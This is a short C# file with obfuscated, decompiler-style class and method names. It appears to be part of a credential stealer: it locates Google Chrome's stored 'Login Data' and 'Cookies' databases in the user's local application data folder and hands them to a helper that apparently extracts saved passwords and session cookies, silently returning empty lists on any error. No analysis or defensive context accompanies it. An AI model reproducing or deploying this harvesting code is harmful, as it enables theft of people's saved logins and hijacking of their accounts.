using System;
using System.Collections.Generic;
using System.IO;

public class GClass13
{
	public static List<GClass56> smethod_0()
	{
		try
		{
			return GClass9.smethod_0(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome\\User Data\\Default\\Login Data"), "Chrome");
		}
		catch (Exception)
		{
			return new List<GClass56>();
		}
	}

	public static List<GClass9.GClass10> smethod_1()
	{
		try
		{
			return GClass9.smethod_1(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome\\User Data\\Default\\Cookies"), "Chrome");
		}
		catch (Exception)
		{
			return new List<GClass9.GClass10>();
		}
	}
}
